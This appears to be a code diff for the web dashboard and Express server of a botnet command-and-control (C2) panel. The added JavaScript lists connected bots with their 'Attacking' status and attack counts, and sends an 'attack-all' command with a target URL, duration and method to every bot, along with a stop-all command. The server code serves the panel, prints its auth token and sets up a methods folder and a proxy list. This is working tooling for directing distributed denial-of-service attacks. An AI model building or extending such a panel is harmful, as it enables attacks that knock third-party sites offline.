@@ -407,7 +407,6 @@ const HTML_UI = `<!DOCTYPE html>
       margin: 0 auto;
     }
 
-    /* Header */
     .header {
       display: flex;
       justify-content: space-between;
@@ -419,7 +418,6 @@ const HTML_UI = `<!DOCTYPE html>
       margin-bottom: 24px;
       flex-wrap: wrap;
       gap: 16px;
-      backdrop-filter: blur(10px);
     }
 
     .header-left {
@@ -546,7 +544,6 @@ const HTML_UI = `<!DOCTYPE html>
       background: #34465a;
     }
 
-    /* Grid */
     .grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -583,7 +580,6 @@ const HTML_UI = `<!DOCTYPE html>
       letter-spacing: 0.5px;
     }
 
-    /* Stats */
     .stats-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
@@ -616,7 +612,6 @@ const HTML_UI = `<!DOCTYPE html>
       margin-top: 4px;
     }
 
-    /* Attack Form */
     .attack-form {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -669,7 +664,6 @@ const HTML_UI = `<!DOCTYPE html>
       flex: 1;
     }
 
-    /* Bot List */
     .bot-list-header {
       display: flex;
       justify-content: space-between;
@@ -773,7 +767,6 @@ const HTML_UI = `<!DOCTYPE html>
       font-size: 12px;
     }
 
-    /* Log Area */
     .log-area {
       background: #0a0e12;
       border: 1px solid #2a3440;
@@ -816,7 +809,6 @@ const HTML_UI = `<!DOCTYPE html>
       color: #e74c3c;
     }
 
-    /* Empty State */
     .empty-state {
       text-align: center;
       padding: 40px 20px;
@@ -829,7 +821,6 @@ const HTML_UI = `<!DOCTYPE html>
       opacity: 0.3;
     }
 
-    /* Responsive */
     @media (max-width: 1024px) {
       .grid {
         grid-template-columns: 1fr;
@@ -885,7 +876,6 @@ const HTML_UI = `<!DOCTYPE html>
 </head>
 <body>
   <div class="container">
-    <!-- Header -->
     <header class="header">
       <div class="header-left">
         <div class="logo">C2</div>
@@ -905,7 +895,6 @@ const HTML_UI = `<!DOCTYPE html>
       </div>
     </header>
 
-    <!-- Stats & Attack -->
     <div class="grid">
       <div class="card">
         <div class="card-header">
@@ -981,7 +970,6 @@ const HTML_UI = `<!DOCTYPE html>
       </div>
     </div>
 
-    <!-- Bot List -->
     <div class="card">
       <div class="card-header">
         <span class="card-title">Bot Network</span>
@@ -993,13 +981,12 @@ const HTML_UI = `<!DOCTYPE html>
       </div>
       <div class="bot-list" id="botList">
         <div class="empty-state">
-          <div class="icon">⏳</div>
+          <div class="icon">...</div>
           <div>Loading bots...</div>
         </div>
       </div>
     </div>
 
-    <!-- Log Area -->
     <div class="log-area" id="logArea">
       <div class="log-entry"><span class="time">[System]</span> Dashboard initialized</div>
     </div>
@@ -1031,4 +1018,145 @@ const HTML_UI = `<!DOCTYPE html>
       const time = new Date().toLocaleTimeString();
       const entry = document.createElement("div");
       entry.className = "log-entry";
-      entry.innerHTML = `<span class="time">[${time
+      const cls = type ? ' class="' + type + '"' : '';
+      entry.innerHTML = '<span class="time">[' + time + ']</span> <span' + cls + '>[' + source + ']</span> ' + message;
+      area.appendChild(entry);
+      area.scrollTop = area.scrollHeight;
+    }
+
+    async function refreshData() {
+      try {
+        const botsData = await apiCall("/bots");
+        if (botsData) {
+          const bots = botsData.bots || [];
+          const list = document.getElementById("botList");
+          if (bots.length === 0) {
+            list.innerHTML = '<div class="empty-state"><div class="icon">-</div><div>No bots connected</div></div>';
+          } else {
+            list.innerHTML = bots.map(function(b) {
+              let statusClass = "offline";
+              let statusText = "Offline";
+              if (b.online) {
+                statusClass = "online";
+                statusText = "Online";
+              }
+              if (b.attacking) {
+                statusClass = "attacking";
+                statusText = "Attacking";
+              }
+              return '<div class="bot-item">' +
+                '<div class="bot-info">' +
+                '<span class="bot-id">' + b.id + '</span>' +
+                '<span class="bot-name">' + b.name + '</span>' +
+                '</div>' +
+                '<div class="bot-status">' +
+                '<span class="status-badge ' + statusClass + '">' + statusText + '</span>' +
+                '<span class="bot-attacks">Attacks: ' + b.attacksPerformed + '</span>' +
+                '</div>' +
+                '</div>';
+            }).join("");
+          }
+          document.getElementById("botCount").textContent = bots.length + " bots";
+        }
+
+        const stats = await apiCall("/api/stats");
+        if (stats) {
+          document.getElementById("statTotalBots").textContent = stats.totalBots || 0;
+          document.getElementById("statOnlineBots").textContent = stats.onlineBots || 0;
+          document.getElementById("statActiveAttacks").textContent = stats.activeAttacks || 0;
+          document.getElementById("statTotalAttacks").textContent = stats.totalAttacks || 0;
+          document.getElementById("statTotalRequests").textContent = stats.totalRequests || 0;
+          document.getElementById("uptime").textContent = stats.uptime || 0;
+        }
+      } catch (e) {
+        addLog("Error", "Failed to refresh data: " + e.message, "error");
+      }
+    }
+
+    async function attackAll() {
+      const target = document.getElementById("attackTarget").value.trim();
+      const time = document.getElementById("attackTime").value;
+      const method = document.getElementById("attackMethod").value;
+      if (!target) {
+        addLog("Attack", "Please enter a target URL", "error");
+        return;
+      }
+      addLog("Attack", "Sending attack-all: " + method + " -> " + target + " for " + time + "s");
+      try {
+        const result = await apiCall("/attack-all?target=" + encodeURIComponent(target) + "&time=" + time + "&methods=" + method);
+        if (result && result.success) {
+          addLog("Attack", "Attack sent to " + result.sent + "/" + result.total + " bots", "success");
+          if (result.failed && result.failed.length) {
+            addLog("Attack", "Failed bots: " + result.failed.join(", "), "error");
+          }
+        } else {
+          addLog("Attack", "Attack failed: " + (result?.error || "Unknown error"), "error");
+        }
+      } catch (e) {
+        addLog("Attack", "Error: " + e.message, "error");
+      }
+      refreshData();
+    }
+
+    async function stopAll() {
+      addLog("System", "Stopping all attacks...");
+      try {
+        const result = await apiCall("/stop-all");
+        if (result && result.success) {
+          addLog("System", "All attacks stopped", "success");
+        } else {
+          addLog("System", "Failed to stop attacks", "error");
+        }
+      } catch (e) {
+        addLog("System", "Error: " + e.message, "error");
+      }
+      refreshData();
+    }
+
+    setInterval(refreshData, 5000);
+    login();
+    refreshData();
+  </script>
+</body>
+</html>`;
+
+// Serve UI on root and dashboard
+app.get(['/', '/dashboard'], (req, res) => {
+  console.log(`[UI] Serving dashboard to ${req.ip}`);
+  res.send(HTML_UI);
+});
+
+// Catch-all: serve UI for any non-API route
+app.use((req, res, next) => {
+  if (req.path.startsWith('/api') || req.path.startsWith('/bots') || req.path.startsWith('/attack') || req.path.startsWith('/stop') || req.path.startsWith('/block') || req.path.startsWith('/unblock') || req.path.startsWith('/remove') || req.path.startsWith('/blocked') || req.path.startsWith('/methods') || req.path.startsWith('/ping') || req.path.startsWith('/health')) {
+    return res.status(404).json({ error: 'API endpoint not found' });
+  }
+  res.send(HTML_UI);
+});
+
+// ========== ERROR HANDLER ==========
+app.use((err, req, res, next) => {
+  console.error('[ERROR]', err.message);
+  res.status(500).json({ error: 'Internal server error' });
+});
+
+// ========== START ==========
+app.listen(port, () => {
+  console.log('\n========================================');
+  console.log('C2 SERVER WITH WEB UI READY');
+  console.log('========================================');
+  console.log('Port: ' + port);
+  console.log('Auth Token: ' + AUTH_TOKEN);
+  console.log('Open in browser: http://localhost:' + port);
+  console.log('(or your Render URL)');
+  console.log('========================================\n');
+
+  if (!fs.existsSync('./methods')) {
+    fs.mkdirSync('./methods');
+    console.log('[SETUP] Created methods directory');
+  }
+  if (!fs.existsSync('./proxy.txt')) {
+    fs.writeFileSync('./proxy.txt', '# Proxies (ip:port)\n');
+    console.log('[SETUP] Created proxy.txt');
+  }
+});
